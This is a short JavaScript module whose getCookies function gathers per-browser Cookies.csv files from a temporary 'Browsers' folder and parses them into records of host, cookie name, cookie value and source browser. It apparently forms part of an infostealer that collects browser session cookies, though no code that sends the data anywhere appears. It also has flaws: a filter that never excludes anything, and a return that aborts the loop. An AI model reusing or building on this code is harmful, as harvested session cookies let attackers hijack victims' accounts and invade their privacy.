const { searchForFile, searchForFolder } = require('./dir');
const { join } = require('path');
const { tempFolder } = require('../index');

/**
 * @returns {Promise<{
 *   host: string,
 *   name: string,
 *   value: string,
 *   source: string
 * }[]>}
 */
module.exports.getCookies = async () => {
  let cookies = [];
  const browsers = await searchForFolder(join(tempFolder, 'Browsers'), 1000) || [];
  for (const browser of browsers.filter(f => f.split('.'))) {
    const file = join(tempFolder, 'Browsers', browser, 'Cookies.csv');
    let line = await searchForFile(file, 1000);
    if (!line) return;
    const lines = line.split('\n').map(k => k.trim().replaceAll(/[\n\r\t"]/gi, ''));
    let keys = lines.shift().split(',').map(k => k.trim().replaceAll(/[\n\r\t"]/gi, '').replaceAll(/ +/g, '_'));
    lines.forEach(line => {
      if (!line || line === '') return;
      line = line.split(',');
      let entry = {};
      keys.forEach((key, i) => {
        entry[key] = line[i];
        entry['source'] = browser;
      });
      cookies.push(entry);
    });
  }
  return cookies;
};